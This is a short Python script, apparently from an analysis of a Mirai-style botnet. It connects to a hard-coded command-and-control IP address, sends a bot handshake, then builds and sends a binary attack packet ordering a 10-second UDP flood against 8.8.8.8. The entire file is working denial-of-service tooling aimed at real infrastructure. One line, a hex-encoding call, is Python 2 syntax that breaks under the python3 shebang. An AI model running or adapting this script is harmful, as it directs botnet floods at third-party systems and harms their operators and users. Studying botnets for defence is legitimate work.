#!/usr/bin/env python3
import socket
import struct
import time
import threading

def monitor_connections():
    """Monitor network connections to see if bot connects"""
    import subprocess
    while True:
        result = subprocess.run(['netstat', '-an'], capture_output=True, text=True)
        if '59666' in result.stdout:
            print("Bot connected to CNC server")
            break
        time.sleep(1)

def test_attack_command():
    # Start monitoring in background
    monitor_thread = threading.Thread(target=monitor_connections)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Connect to CNC server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('185.247.117.214', 59666))
    
    # Send bot identification (like attack.debug does)
    s.send(b'\x00\x00\x00\x01')  # Version 1
    s.send(b'\x00')  # No source string
    
    print("Connected to CNC server")
    
    # Wait a bit for connection to be established
    time.sleep(2)
    
    # Create a simple UDP attack command
    # Format: [duration(4)] [vector(1)] [targets_len(1)] [targets] [opts_len(1)] [opts]
    
    duration = 10  # 10 seconds
    vector = 0     # UDP flood
    targets_len = 1
    target_ip = socket.inet_aton('8.8.8.8')  # Test target
    netmask = 32
    opts_len = 0
    
    # Build attack packet
    packet = struct.pack('>I', duration)  # Duration (big endian)
    packet += struct.pack('B', vector)    # Vector
    packet += struct.pack('B', targets_len)  # Number of targets
    packet += target_ip + struct.pack('B', netmask)  # Target IP and netmask
    packet += struct.pack('B', opts_len)  # Number of options
    
    # Add length header (2 bytes big endian) - total length including header
    length = len(packet) + 2
    full_packet = struct.pack('>H', length) + packet
    
    print("Sending attack packet: {} bytes".format(len(full_packet)))
    print("Packet data: {}".format(full_packet.encode('hex')))
    
    # Send the attack command
    s.send(full_packet)
    
    print("Attack command sent!")
    
    # Keep connection alive for a bit
    time.sleep(10)
    
    s.close()
    print("Connection closed")

if __name__ == "__main__":
    test_attack_command()
